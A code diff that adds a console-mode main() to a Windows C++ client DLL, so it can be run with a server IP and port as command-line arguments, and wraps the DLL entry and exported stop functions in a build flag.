@@ -16,6 +16,48 @@ bool g_bThreadExit = false;
 HINSTANCE  g_hInstance = NULL;        
 DWORD WINAPI StartClient(LPVOID lParam);
 
+#if _CONSOLE
+
+enum { E_RUN, E_STOP } status;
+
+BOOL CALLBACK callback(DWORD CtrlType)
+{
+	if (CtrlType == CTRL_CLOSE_EVENT)
+	{
+		g_bExit = true;
+		while (E_RUN == status)
+			Sleep(20);
+	}
+	return TRUE;
+}
+
+int main(int argc, const char *argv[])
+{
+	status = E_RUN;
+	if (argc < 3)
+	{
+		std::cout<<"参数不足.\n";
+		return -1;
+	}
+	
+	SetConsoleCtrlHandler(&callback, TRUE);
+	const char *szServerIP = argv[1];
+	int uPort = atoi(argv[2]);
+	printf("[remote] %s:%d\n", szServerIP, uPort);
+
+	memcpy(g_szServerIP,szServerIP,strlen(szServerIP));
+	g_uPort = uPort;
+
+	HANDLE hThread = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)StartClient,NULL,0,NULL);
+
+	WaitForSingleObject(hThread, INFINITE);
+	CloseHandle(hThread);
+	status = E_STOP;
+
+	return 0;
+}
+#else
+
 BOOL APIENTRY DllMain( HINSTANCE hInstance, 
 					  DWORD  ul_reason_for_call, 
 					  LPVOID lpReserved
@@ -58,6 +100,7 @@ extern "C" __declspec(dllexport) void StopRun() { g_bExit = true; }
 // 是否成功停止
 extern "C" __declspec(dllexport) bool IsStoped() { return g_bThreadExit; }
 
+#endif
 
 DWORD WINAPI StartClient(LPVOID lParam)
 {
